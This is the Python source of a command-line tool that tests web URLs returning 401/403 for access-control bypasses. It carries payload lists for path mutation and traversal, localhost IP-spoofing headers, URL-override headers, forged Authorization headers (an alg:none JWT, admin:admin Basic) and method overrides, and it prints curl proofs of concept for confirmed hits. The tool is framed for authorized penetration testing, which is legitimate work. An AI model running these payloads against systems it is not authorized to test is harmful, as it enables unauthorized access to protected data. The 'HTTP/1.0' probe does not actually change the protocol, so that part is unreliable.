#!/usr/bin/env python3
"""
bypasshunt — 401/403 access-control bypass tester.

Two phases:
  1. DETECT   confirm the URL really is access-denied, and learn what this
              server's "denied", "missing" and "real content" responses look like
  2. BYPASS   path mutations, header injection, method and protocol switching,
              and byte insertion at HTTP-parser boundaries

The hard part of this tool class is not sending payloads, it is not lying about
the result. A status change alone means nothing: soft-404s, login redirects and
generic error pages all return 200. Every candidate here is scored against three
baselines and then replayed before it is reported. See Verdict for the rules.

Technique sources: PortSwigger url-fuzzer-401-403-bypass (parser-inconsistency
byte insertion, after Orange Tsai / Rafael da Costa Santos), jsmon.sh 403-bypass
tricks, nazmul-ethi/Bypass-Four03.

For authorized testing only.
"""

from __future__ import annotations

import argparse
import concurrent.futures
import os
import random
import re
import string
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from urllib.parse import quote, urlsplit, urlunsplit

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

MAX_BODY = 2 * 1024 * 1024

UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")

CRIT, HIGH, MED, LOW, INFO = "CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"
_SEV_ORDER = {CRIT: 0, HIGH: 1, MED: 2, LOW: 3, INFO: 4}

DENIED_CODES = {401, 403, 405, 406, 407, 423, 451}


# ----------------------------------------------------------------------------
# colour
# ----------------------------------------------------------------------------

ANSI = {
    CRIT: "\033[1;95m", HIGH: "\033[1;91m", MED: "\033[1;93m",
    LOW: "\033[1;96m", INFO: "\033[0;37m",
    "ok": "\033[1;92m", "warn": "\033[0;93m", "bad": "\033[0;91m",
    "dim": "\033[0;90m", "b": "\033[1m", "head": "\033[1;36m", "x": "\033[0m",
}
_COLOR = True


def set_color(enabled):
    global _COLOR
    _COLOR = enabled


def paint(s, key):
    return s if not _COLOR else f"{ANSI.get(key, '')}{s}{ANSI['x']}"


def status_key(code):
    try:
        code = int(code)
    except (TypeError, ValueError):
        return "dim"
    if 200 <= code < 300:
        return "ok"
    if 300 <= code < 400:
        return "warn"
    if code in DENIED_CODES:
        return "bad"
    return "dim"


# ----------------------------------------------------------------------------
# status
# ----------------------------------------------------------------------------

class Status:
    """
    Periodic status heartbeat for list mode (-l).

    Emitted on a timer from a daemon thread, so it fires at a steady wall-clock
    interval regardless of verbosity and regardless of how long any one host
    takes. Prints whole lines rather than redrawing in place: at -v 1 the output
    scrolls constantly, so an in-place indicator would be unreadable.

    Not used for a single target (-u) -- one host needs no queue accounting.
    """

    def __init__(self, console, total, interval=30.0, enabled=True):
        self.con = console
        self.total = total
        self.interval = interval
        self.enabled = enabled
        self.done = 0
        self.counts = {CRIT: 0, HIGH: 0, MED: 0, LOW: 0, INFO: 0}
        self._lk = threading.Lock()
        self._stop = threading.Event()
        self._thread = None
        self._t0 = 0.0

    def start(self):
        if not self.enabled:
            return
        self._t0 = time.time()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        # wait() returns True only when stop() is set, so a normal timeout emits
        while not self._stop.wait(self.interval):
            self.emit()

    def host_done(self, n=1):
        with self._lk:
            self.done += n

    def record(self, sev):
        with self._lk:
            if sev in self.counts:
                self.counts[sev] += 1

    def emit(self, label="status"):
        if not self.enabled:
            return
        with self._lk:
            done, c = self.done, dict(self.counts)
        remaining = max(0, self.total - done)
        el = int(time.time() - self._t0)
        self.con.line(paint(
            f"  [{label} {el // 60:02d}:{el % 60:02d}]  "
            f"tested {done}/{self.total}  remaining {remaining}  |  "
            f"crit {c[CRIT]}  high {c[HIGH]}  med {c[MED]}  "
            f"low {c[LOW]}  info {c[INFO]}", "head"))

    def stop(self):
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=1)


# ----------------------------------------------------------------------------
# console
# ----------------------------------------------------------------------------

class Console:
    """v=0 prints confirmed bypasses only. v=1 prints every probe."""

    def __init__(self, level=0):
        self.level = level
        self._lk = threading.Lock()

    def line(self, msg):
        """One whole line, printed atomically — used by the Status heartbeat."""
        with self._lk:
            print(msg)
            sys.stdout.flush()

    def finding(self, f: "Finding"):
        with self._lk:
            print(f"\n{paint('['+f.sev+']', f.sev)} {paint(f.title, f.sev)}")
            print(f"  {paint('Target    :', 'head')} {f.url}")
            print(f"  {paint('Baseline  :', 'head')} HTTP {f.baseline}")
            print(f"  {paint('Technique :', 'head')} {f.technique}")
            print(f"  {paint('Result    :', 'head')} "
                  f"{paint('HTTP ' + str(f.status), 'ok')}  "
                  f"CL={f.length}  CT={f.ctype or '-'}")
            if f.evidence:
                print(f"  {paint('Evidence  :', 'head')} {f.evidence}")
            if f.curl:
                print(f"  {paint('PoC       :', 'head')} {paint(f.curl, 'warn')}")
            sys.stdout.flush()

    def probe(self, target, name, result, cl=None, ct=""):
        """
        One test line: technique, status, CL, CT.

        CL is the measured body size and CT the Content-Type -- the two columns
        you actually triage a bypass sweep on, since a status change with an
        unchanged CL/CT is almost always the same page again. The verdict's
        reasoning is deliberately not on this line; it is available at -v 2.
        """
        if self.level < 1:
            return
        meta = ""
        if cl is not None:
            meta = f"CL={str(cl):<7} CT={(ct or '-')[:24]}"
        self.line(f"  {paint('·', 'dim')}  {paint(target, 'dim')}  "
                  f"{name:<46} {paint(f'{result:<5}', status_key(result))} "
                  f"{paint(meta, 'dim')}")

    def info(self, msg):
        if self.level >= 1:
            self.line(f"{paint('[info]', 'head')} {msg}")

    def debug(self, msg):
        if self.level >= 2:
            self.line(f"{paint('[dbg ]', 'dim')} {msg}")

    def warn(self, msg):
        if self.level >= 1:
            self.line(f"{paint('[warn]', 'warn')} {msg}")

    def skip(self, msg):
        """Always shown — the user needs to know a target went untested."""
        self.line(f"{paint('[skip]', 'warn')} {msg}")

    def error(self, msg):
        with self._lk:
            print(f"{paint('[err ]', 'bad')} {msg}", file=sys.stderr)
            sys.stderr.flush()

    def banner(self, msg):
        if self.level >= 1:
            self.line(f"\n{paint('=== ' + msg + ' ===', 'head')}")


# ----------------------------------------------------------------------------
# model
# ----------------------------------------------------------------------------

@dataclass
class Finding:
    title: str
    url: str
    technique: str
    status: int
    length: int
    ctype: str = ""
    sev: str = HIGH
    baseline: str = ""
    evidence: str = ""
    curl: str = ""
    when: str = field(default_factory=lambda: datetime.now(timezone.utc).isoformat())


@dataclass
class Resp:
    status: int
    body: str
    headers: dict
    elapsed: float
    error: str = ""

    @property
    def ok(self):
        return not self.error

    @property
    def length(self) -> int:
        """
        Measured body size, not the Content-Length header.

        The header is absent under chunked encoding and is occasionally wrong;
        what matters for comparing responses is how many bytes actually arrived.
        """
        return len(self.body)

    @property
    def ctype(self) -> str:
        """Content-Type without the charset parameter."""
        for k, v in self.headers.items():
            if k.lower() == "content-type":
                return v.split(";")[0].strip()
        return ""


@dataclass
class Attempt:
    """One bypass to try: a fully-formed request description."""
    technique: str
    url: str
    method: str = "GET"
    headers: dict = field(default_factory=dict)
    http10: bool = False


# ----------------------------------------------------------------------------
# http
# ----------------------------------------------------------------------------

class Http:
    """
    Per-thread session, global rate limit.

    Path mutations are the whole point of this tool, so the raw path must reach
    the server byte-for-byte. requests normalises dot segments and duplicate
    slashes while preparing a URL, which would silently destroy `/./`, `//` and
    `/..;/` payloads -- so the prepared request's url is overwritten with the
    literal string after preparation.
    """

    def __init__(self, console, timeout=15.0, delay=0.0, proxy=None,
                 extra_headers=None, verify=False):
        self.con = console
        self.timeout = timeout
        self.verify = verify
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.base_headers = {"User-Agent": UA,
                             "Accept": "text/html,application/xhtml+xml,*/*;q=0.8"}
        for h in extra_headers or []:
            if ":" in h:
                k, _, v = h.partition(":")
                self.base_headers[k.strip()] = v.strip()
        self._min_gap = max(0.0, delay)
        self._next = 0.0
        self._rate_lk = threading.Lock()
        self._cnt_lk = threading.Lock()
        self._local = threading.local()
        self.count = 0

    def _session(self):
        s = getattr(self._local, "s", None)
        if s is None:
            s = requests.Session()
            self._local.s = s
        return s

    def _throttle(self):
        if self._min_gap <= 0:
            return
        with self._rate_lk:
            now = time.monotonic()
            wait = max(0.0, self._next - now)
            self._next = max(now, self._next) + self._min_gap
        if wait:
            time.sleep(wait)

    def send(self, att: Attempt) -> Resp:
        self._throttle()
        with self._cnt_lk:
            self.count += 1
        headers = dict(self.base_headers)
        headers.update(att.headers)
        started = time.monotonic()
        try:
            s = self._session()
            # prepare against a safe URL, then substitute the literal one so the
            # mutation survives requests' normalisation
            base = urlsplit(att.url)
            safe = urlunsplit((base.scheme, base.netloc, "/", "", ""))
            req = requests.Request(att.method, safe, headers=headers).prepare()
            req.url = att.url
            r = s.send(req, timeout=self.timeout, verify=self.verify,
                       proxies=self.proxies, allow_redirects=False, stream=True)
            raw = r.raw.read(MAX_BODY, decode_content=True) or b""
            body = raw.decode(r.encoding or "utf-8", errors="replace")
            return Resp(r.status_code, body, dict(r.headers),
                        time.monotonic() - started)
        except requests.RequestException as e:
            return Resp(0, "", {}, time.monotonic() - started, error=str(e))


# ----------------------------------------------------------------------------
# similarity
# ----------------------------------------------------------------------------

_NOISE = [
    re.compile(r"\b\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}(:\d{2})?\b"),
    re.compile(r"\b[0-9a-f]{16,64}\b", re.I),
    re.compile(r"\b\d{10,13}\b"),
    re.compile(r"\s+"),
]


def normalize(body: str) -> str:
    out = body
    for rx in _NOISE[:-1]:
        out = rx.sub("", out)
    return _NOISE[-1].sub(" ", out).strip()


def shingles(text: str, k: int = 24) -> set:
    if len(text) <= k:
        return {text}
    step = max(1, k // 3)
    return {text[i:i + k] for i in range(0, len(text) - k, step)}


def similarity(a: str, b: str) -> float:
    if a == b:
        return 1.0
    sa, sb = shingles(a), shingles(b)
    if not sa or not sb:
        return 1.0 if sa == sb else 0.0
    return len(sa & sb) / float(len(sa | sb))


# ----------------------------------------------------------------------------
# payloads
# ----------------------------------------------------------------------------

# Suffixes/prefixes applied around the protected path segment.
PATH_MUTATIONS = [
    "{p}/", "{p}//", "//{p}", "//{p}//", "{p}/.", "/./{p}", "{p}/./",
    "{p}/..", "{p}/../", "{p}%20", "{p}%09", "{p}%00", "{p}%0a", "{p}%0d",
    "{p}%23", "{p}%3f", "{p}%3b", "{p};", "{p};/", "{p};a=b", "{p}.",
    "{p}..", "{p}...", "{p}~", "{p}?", "{p}#", "{p}&", "{p}*",
    "{p}%2e", "{p}/%2e", "%2e/{p}", "{p}%252e", "{p}%2f", "{p}/%2f",
    "{p}%ef%bc%8f", "{p}%c0%af", "{p}%c0%ae",
    "{p}.json", "{p}.html", "{p}.xml", "{p}.php", "{p}.jsp", "{p}.asp",
    "{p}.aspx", "{p}.txt", "{p}.bak", "{p}.old", "{p}.config", "{p}.log",
    "/{p}", "./{p}", "/%2f{p}", "/./{p}/./",
]

# Traversal shapes that re-enter the protected path from a permitted one.
TRAVERSAL = [
    "{d}/..;/{last}", "{d}/../{last}", "{d}/..%2f{last}", "{d}/..%252f{last}",
    "{d}/.;/{last}", "{d}/%2e%2e/{last}", "{d}/%252e%252e/{last}",
    "/anything/../{p}", "/anything/..;/{p}", "/;/{p}", "/.;/{p}",
]

# Header families. {path} is substituted with the protected path.
LOCAL_IPS = ["127.0.0.1", "localhost", "127.0.0.1:80", "2130706433",
             "0x7F000001", "0177.0.0.1", "10.0.0.1", "192.168.1.1", "::1"]

IP_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "Client-IP",
              "X-Client-IP", "X-Remote-IP", "X-Remote-Addr",
              "X-Custom-IP-Authorization", "True-Client-IP", "CF-Connecting-IP",
              "X-Forwarded-Host", "X-Host", "X-ProxyUser-Ip"]

URL_HEADERS = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
               "X-Forwarded-Path", "X-Original-Path", "Request-Uri",
               "X-HTTP-DestinationURL"]

FLAG_HEADERS = [
    ("X-Internal-Request", "true"), ("X-Admin-Panel", "enabled"),
    ("X-Forwarded-Proto", "https"), ("X-Forwarded-Scheme", "http"),
    ("X-Forwarded-Port", "8080"), ("Content-Length", "0"),
    ("X-Requested-With", "XMLHttpRequest"),
]

BOT_AGENTS = [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "InternalApp/1.0",
]

# Fake / malformed Authorization headers.
#
# Aimed at 401s specifically. Some auth modules and edge configurations only
# check whether an Authorization header is *present*, or fail open when one is
# present but unparseable, so a syntactically wrong header can pass where no
# header is rejected.
#
# Read the result carefully: on an edge-enforced 401 the usual effect of sending
# a bad credential is 401 -> 403, i.e. challenge replaced by hard deny. That is
# the control working, not a bypass, and it is why the Verdict rules reject a
# status change whose body matches the denied/soft-404 baseline. A real hit here
# returns the protected application, not an "Access Denied" page.
AUTH_HEADERS = [
    ("Authorization", "Bearer xyz"),
    ("Authorization", "Bearer null"),
    ("Authorization", "Bearer undefined"),
    ("Authorization", "Bearer eyJhbGciOiJub25lIn0.e30."),
    ("Authorization", "Basic"),
    ("Authorization", "Basic "),
    ("Authorization", "Basic Og=="),               # ":"  (empty user:pass)
    ("Authorization", "Basic YWRtaW46"),           # "admin:"
    ("Authorization", "Basic YWRtaW46YWRtaW4="),   # "admin:admin"
    ("Authorization", "Basic !!!notbase64!!!"),
    ("Authorization", "basic Og=="),               # lowercase scheme
    ("Authorization", "BASIC Og=="),
    ("Authorization", "Negotiate YIIB"),
    ("Authorization", "Digest username=\"a\""),
    ("Authorization", "null"),
    ("Authorization", "None"),
    ("Authorization", "0"),
    ("Authorization", ""),
    ("Proxy-Authorization", "Basic Og=="),
    ("Proxy-Authorization", "Bearer xyz"),
    ("WWW-Authenticate", "Basic"),
]

METHODS = ["POST", "HEAD", "OPTIONS", "PUT", "PATCH", "TRACE", "DELETE",
           "CONNECT", "PROPFIND", "FOO"]

METHOD_OVERRIDE = ["X-HTTP-Method-Override", "X-HTTP-Method", "X-Method-Override"]

QUERY_TRICKS = ["?admin=1", "?debug=true", "?internal=yes", "?role=admin",
                "?role=user&role=admin", "?is_admin=true", "?access=1"]

# Bytes worth inserting at parser boundaries. The PortSwigger extension sweeps
# all 0-255; that is 256 requests per insertion point per path, which is far too
# noisy for a scan. These are the ones that historically split parsers.
PARSER_BYTES = ["%00", "%09", "%0a", "%0b", "%0c", "%0d", "%1f", "%20",
                "%85", "%a0", "%c0", "%ff", "%2e", "%2f", "%5c", "%09%20"]


# ----------------------------------------------------------------------------
# verdict
# ----------------------------------------------------------------------------

class Verdict:
    """
    Decides whether a response is genuinely a bypass.

    Three baselines are taken before any payload is sent:

      denied   the protected URL's own 401/403
      missing  a random path that certainly does not exist -- this is what a
               soft-404 looks like on this server, and it is the single biggest
               source of false positives in tools of this kind
      root     the site root, i.e. what ordinary public content looks like

    A candidate is only reported when it is 2xx, is not near-identical to the
    denied or missing baselines, and does not look like a login page. It is then
    replayed; a result that does not reproduce is discarded as a fluke.
    """

    LOGIN_MARKERS = re.compile(
        r"(type=[\"']?password|j_security_check|<form[^>]*login|"
        r"sign\s*in|se\s*connecter|anmelden|iniciar\s*sesi)", re.I)

    def __init__(self, denied: Resp, missing: Resp, root: Resp, con: Console,
                 min_delta=0.15):
        self.denied_n = normalize(denied.body)
        self.missing_n = normalize(missing.body) if missing and missing.ok else ""
        self.root_n = normalize(root.body) if root and root.ok else ""
        self.denied_status = denied.status
        self.con = con
        self.min_delta = min_delta

    def judge(self, r: Resp) -> tuple[bool, str]:
        if not r.ok:
            return False, f"transport error: {r.error[:60]}"
        if r.status in DENIED_CODES:
            return False, "still denied"
        if r.status >= 500:
            return False, "server error"
        if 300 <= r.status < 400:
            return False, "redirect"
        if r.status < 200 or r.status >= 300:
            return False, f"non-2xx ({r.status})"
        if not r.body.strip():
            return False, "empty body"

        n = normalize(r.body)
        s_denied = similarity(self.denied_n, n)
        if s_denied > (1.0 - self.min_delta):
            return False, f"body ~= denied page (sim {s_denied:.2f})"
        if self.missing_n:
            s_missing = similarity(self.missing_n, n)
            if s_missing > (1.0 - self.min_delta):
                return False, f"body ~= soft-404 page (sim {s_missing:.2f})"
        if self.root_n:
            # The URL-override techniques request "/" and carry the protected
            # path in a header. If the server ignores the header we get the
            # public homepage back -- 2xx, and unlike both the denied and 404
            # pages, so it passes every other check. Without this comparison
            # every X-Original-URL-style header reports as a bypass.
            s_root = similarity(self.root_n, n)
            if s_root > (1.0 - self.min_delta):
                return False, f"body ~= site root, header ignored (sim {s_root:.2f})"
        if self.LOGIN_MARKERS.search(r.body[:4000]):
            return False, "looks like a login page"
        return True, f"2xx, {len(r.body)}b, differs from denied ({s_denied:.2f})"


# ----------------------------------------------------------------------------
# scanner
# ----------------------------------------------------------------------------

class BypassHunter:
    def __init__(self, http: Http, con: Console, args, status: Status = None):
        self.http = http
        self.con = con
        self.args = args
        self.status = status
        self.findings: list[Finding] = []
        self.skipped: list[dict] = []
        self.tested = 0
        self._lk = threading.Lock()

    def add(self, f: Finding):
        with self._lk:
            self.findings.append(f)
        if self.status:
            self.status.record(f.sev)
        self.con.finding(f)

    def bump(self, n=1):
        with self._lk:
            self.tested += n

    # -- attempt construction

    @staticmethod
    def _split(url: str):
        u = urlsplit(url)
        path = u.path or "/"
        base = urlunsplit((u.scheme, u.netloc, "", "", ""))
        return base, path, u.query

    # -- phases

    def baselines(self, url: str):
        base, path, _ = self._split(url)
        denied = self.http.send(Attempt("baseline", url))
        rand = "/zz" + "".join(random.choices(
            string.ascii_lowercase + string.digits, k=12))
        missing = self.http.send(Attempt("baseline-404", base + rand))
        root = self.http.send(Attempt("baseline-root", base + "/"))
        self.bump(3)
        return denied, missing, root

    def attempts_for(self, url: str) -> list[Attempt]:
        u = urlsplit(url)
        base = urlunsplit((u.scheme, u.netloc, "", "", ""))
        path = u.path or "/"
        q = ("?" + u.query) if u.query else ""
        p = path.lstrip("/")
        segs = [s for s in path.split("/") if s]
        last = segs[-1] if segs else ""
        parent = "/" + "/".join(segs[:-1]) if len(segs) > 1 else ""
        out: list[Attempt] = []

        def A(tech, u_, **kw):
            out.append(Attempt(tech, u_, **kw))

        # 1. path mutations
        for m in PATH_MUTATIONS:
            mutated = m.format(p=p)
            if not mutated.startswith("/"):
                mutated = "/" + mutated
            A(f"path: {m}", base + mutated + q)

        # 2. case variation
        if last and last.lower() != last.upper():
            for variant in (last.upper(), last.capitalize(),
                            "".join(c.upper() if i % 2 else c
                                    for i, c in enumerate(last))):
                A(f"case: {variant}", base + (parent or "") + "/" + variant + q)

        # 3. traversal re-entry
        for t in TRAVERSAL:
            try:
                mutated = t.format(d=parent or "", last=last, p=p)
            except (KeyError, IndexError):
                continue
            if not mutated.startswith("/"):
                mutated = "/" + mutated
            A(f"traversal: {t}", base + mutated + q)

        # 4. parser byte insertion (PortSwigger technique, narrowed)
        for b in PARSER_BYTES:
            A(f"byte-suffix: {b}", base + path + b + q)
            if last:
                A(f"byte-inpath: {b}", base + (parent or "") + "/" + b + last + q)
                A(f"byte-mid: {b}", base + (parent or "") + "/" + last + b + "/" + q)

        # 5. IP-spoof headers
        for h in IP_HEADERS:
            for ip in LOCAL_IPS[:4]:
                A(f"header: {h}: {ip}", url, headers={h: ip})

        # 6. URL-override headers
        for h in URL_HEADERS:
            A(f"header: {h}: {path}", base + "/" + q, headers={h: path})
            A(f"header: {h} (on target)", url, headers={h: path})

        # 7a. fake / malformed Authorization headers
        for h, v in AUTH_HEADERS:
            shown = v if len(v) <= 30 else v[:27] + "..."
            A(f"auth: {h}: {shown or '<empty>'}", url, headers={h: v})
        # doubled header, and a valid-looking one alongside a broken one
        A("auth: two Authorization values",
          url, headers={"Authorization": "Basic Og==, Bearer xyz"})

        # 7b. flag headers, referer/origin
        for h, v in FLAG_HEADERS:
            A(f"header: {h}: {v}", url, headers={h: v})
        A("header: Referer (self)", url, headers={"Referer": url})
        A("header: Origin (self)", url, headers={"Origin": base})
        for ua in BOT_AGENTS:
            A(f"user-agent: {ua[:28]}", url, headers={"User-Agent": ua})

        # 8. methods and overrides
        for m in METHODS:
            A(f"method: {m}", url, method=m)
        for h in METHOD_OVERRIDE:
            A(f"override: {h}: GET", url, method="POST", headers={h: "GET"})

        # 9. query tricks
        for t in QUERY_TRICKS:
            A(f"query: {t}", url + ("&" + t[1:] if q else t))

        # 10. protocol downgrade
        A("protocol: HTTP/1.0", url, http10=True)

        return out

    def run_target(self, url: str):
        self.con.banner(f"Testing {url}")
        denied, missing, root = self.baselines(url)

        if not denied.ok:
            with self._lk:
                self.skipped.append({"url": url, "reason": denied.error[:80]})
            self.con.skip(f"{url} — no response ({denied.error[:60]})")
            return
        if denied.status not in DENIED_CODES:
            self.con.info(f"{url} returns HTTP {denied.status}, not an access-denied "
                          f"status — nothing to bypass")
            with self._lk:
                self.skipped.append({"url": url,
                                     "reason": f"HTTP {denied.status}, not 4xx"})
            return

        self.con.info(
            f"baselines — denied: {denied.status} CL={denied.length} "
            f"CT={denied.ctype or '-'} | soft-404: {missing.status} "
            f"CL={missing.length} CT={missing.ctype or '-'} | root: {root.status} "
            f"CL={root.length} CT={root.ctype or '-'}")
        verdict = Verdict(denied, missing, root, self.con, self.args.min_delta)

        attempts = self.attempts_for(url)
        self.con.info(f"{len(attempts)} bypass attempts queued")

        hits = 0
        for att in attempts:
            r = self.http.send(att)
            self.bump()
            good, why = verdict.judge(r)
            self.con.probe(url, att.technique, r.status if r.ok else "err",
                           cl=r.length, ct=r.ctype)
            if not good:
                self.con.debug(f"  {att.technique}: rejected — {why}")
                continue

            # replay before believing it
            r2 = self.http.send(att)
            self.bump()
            good2, why2 = verdict.judge(r2)
            if not good2:
                self.con.debug(f"  {att.technique}: did not reproduce ({why2})")
                continue
            if abs(r2.length - r.length) > max(64, r.length * 0.25):
                self.con.debug(f"  {att.technique}: unstable length "
                               f"{r.length}->{r2.length}, discarding")
                continue

            hits += 1
            self.report(url, att, r, denied, why)
            if self.args.first_only:
                self.con.info("stopping after first confirmed bypass (--first-only)")
                break

        if not hits:
            self.con.info(f"{url}: no bypass found ({len(attempts)} attempts)")

    def report(self, url, att: Attempt, r: Resp, denied: Resp, why: str):
        hdr = " ".join(f"-H '{k}: {v}'" for k, v in att.headers.items())
        meth = "" if att.method == "GET" else f"-X {att.method} "
        curl = f"curl -sk {meth}'{att.url}' {hdr}".strip()

        self.add(Finding(
            title="Access-control bypass confirmed",
            url=url, technique=att.technique, status=r.status, length=r.length,
            ctype=r.ctype, sev=HIGH, baseline=f"{denied.status} CL={denied.length} CT={denied.ctype or '-'}",
            evidence=why + "; reproduced on replay", curl=curl))


# ----------------------------------------------------------------------------
# cli
# ----------------------------------------------------------------------------

BANNER = r"""
  bypasshunt — 401/403 access-control bypass tester
  authorized testing only
"""

EPILOG = """
how a bypass is confirmed
  Three baselines are taken first: the protected URL's own 4xx, a random
  non-existent path (what a soft-404 looks like here), and the site root. A
  candidate must be 2xx, differ from BOTH the denied page and the soft-404 page,
  not look like a login form, and then reproduce on replay with a stable body
  length. Status-code-only "bypasses" are the standard failure mode of this tool
  class and are rejected here.

techniques
  path mutations, case variation, traversal re-entry (..;/ and friends),
  fake/malformed Authorization headers (Bearer xyz, empty Basic, bad base64),
  parser-boundary byte insertion, IP-spoof headers, URL-override headers
  (X-Original-URL / X-Rewrite-URL), flag headers, bot user-agents, HTTP methods
  and method-override headers, query-parameter tricks, protocol downgrade.

safety
  Every target you supply is requested. There is no allowlist -- feed it a
  pre-filtered, in-scope list.

  Read-only by default: methods that could modify state (PUT/PATCH/DELETE) are
  sent only with --unsafe-methods, since on a real app they may write.

colour
  On by default. Disable with --no-color or NO_COLOR=1.

status line
  In -l mode a heartbeat prints every 30s (--status-interval) at any verbosity.
  Not shown for -u.

examples
  bypasshunt.py -u https://target/admin
  bypasshunt.py -u https://target/admin -v 1
  bypasshunt.py -l denied-urls.txt -v 1
  bypasshunt.py -l urls.txt --no-color --first-only
"""


def build_parser():
    p = argparse.ArgumentParser(
        prog="bypasshunt.py", description=BANNER, epilog=EPILOG,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("-v", type=int, default=0, choices=[0, 1, 2], dest="verbosity",
                   help="0 = confirmed bypasses only (default), 1 = every "
                        "attempt, 2 = debug (rejected candidates and why)")
    p.add_argument("-u", "--url", help="single target URL")
    p.add_argument("-l", "--list", help="file of target URLs, one per line")
    p.add_argument("--no-color", action="store_true",
                   help="disable coloured output (colour is on by default)")
    p.add_argument("--status-interval", type=float, default=30.0, metavar="SEC",
                   help="seconds between status lines in -l mode (default 30)")
    p.add_argument("-t", "--threads", type=int, default=4,
                   help="concurrent targets (default 4)")
    p.add_argument("-d", "--delay", type=float, default=0.0,
                   help="minimum gap between requests (s), enforced globally")
    p.add_argument("--timeout", type=float, default=15.0, help="request timeout")
    p.add_argument("-H", "--header", action="append", default=[],
                   help="extra header 'Name: value' (repeatable)")
    p.add_argument("-p", "--proxy", help="proxy URL, e.g. http://127.0.0.1:8080")
    p.add_argument("--first-only", action="store_true",
                   help="stop a target after its first confirmed bypass")
    p.add_argument("--unsafe-methods", action="store_true",
                   help="also try PUT/PATCH/DELETE (may modify state)")
    p.add_argument("--min-delta", type=float, default=0.15, metavar="F",
                   help="how different from a baseline a body must be "
                        "(0-1, default 0.15)")
    return p


def load_urls(path):
    out = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if line and not line.startswith("#"):
                out.append(line if line.startswith(("http://", "https://"))
                           else "https://" + line)
    return out


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if not args.url and not args.list:
        parser.print_help()
        return 2
    set_color(not (args.no_color or os.environ.get("NO_COLOR")))

    if not args.unsafe_methods:
        for m in ("PUT", "PATCH", "DELETE"):
            if m in METHODS:
                METHODS.remove(m)

    urls = []
    if args.url:
        urls.append(args.url if args.url.startswith(("http://", "https://"))
                    else "https://" + args.url)
    if args.list:
        if not os.path.isfile(args.list):
            print(f"error: no such file: {args.list}", file=sys.stderr)
            return 2
        urls.extend(load_urls(args.list))
    urls = list(dict.fromkeys(urls))
    if not urls:
        print("error: no targets", file=sys.stderr)
        return 2

    con = Console(args.verbosity)
    status = Status(con, len(urls), interval=args.status_interval,
                    enabled=bool(args.list))

    print(paint(BANNER, "head"))
    print(f"  targets {paint(str(len(urls)), 'b')}   threads {args.threads}   "
          f"timeout {args.timeout:.0f}s")
    print(f"  unsafe methods "
          f"{paint('ON', 'bad') if args.unsafe_methods else paint('off', 'ok')}"
          + (f"        status every {args.status_interval:.0f}s"
             if status.enabled else ""))
    print()

    http = Http(con, timeout=args.timeout, delay=args.delay, proxy=args.proxy,
                extra_headers=args.header)
    hunter = BypassHunter(http, con, args, status)

    started = time.time()
    status.start()

    def one(u):
        try:
            hunter.run_target(u)
        except Exception as e:
            con.error(f"{u}: {type(e).__name__}: {e}")
        finally:
            status.host_done()

    try:
        if args.threads > 1 and len(urls) > 1:
            with concurrent.futures.ThreadPoolExecutor(
                    max_workers=args.threads) as pool:
                list(pool.map(one, urls))
        else:
            for u in urls:
                one(u)
    except KeyboardInterrupt:
        con.error("interrupted by user")
    finally:
        status.stop()
        status.emit(label="final")

    elapsed = time.time() - started
    print(f"\n  {paint(str(len(hunter.findings)), 'b')} bypass(es) confirmed "
          f"from {http.count} requests in {elapsed:.0f}s")
    for sev in (CRIT, HIGH, MED, LOW):
        n = sum(1 for f in hunter.findings if f.sev == sev)
        if n:
            print(f"    {paint(sev, sev):<20} {n}")
    if hunter.skipped:
        print(f"  {paint('skipped', 'warn')}: {len(hunter.skipped)}")
        for s in hunter.skipped[:10]:
            print(f"    - {s['url']}  [{s['reason']}]")
    return 1 if hunter.findings else 0


if __name__ == "__main__":
    sys.exit(main())
